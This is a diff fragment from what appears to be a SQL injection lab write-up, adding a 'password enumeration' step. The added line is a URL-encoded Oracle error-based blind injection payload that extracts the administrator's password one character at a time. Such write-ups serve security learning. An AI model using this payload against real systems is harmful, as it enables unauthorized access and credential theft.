@@ -126,6 +126,7 @@ now we need to get all content of the database notice that we will use **informa
    when the right length found an error will accured
 
 4. password enumuration:
+   '||(SELECT+CASE+WHEN+SUBSTR(password,13,1)%3d'w'+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username%3d'administrator')||'
 
 ---
 
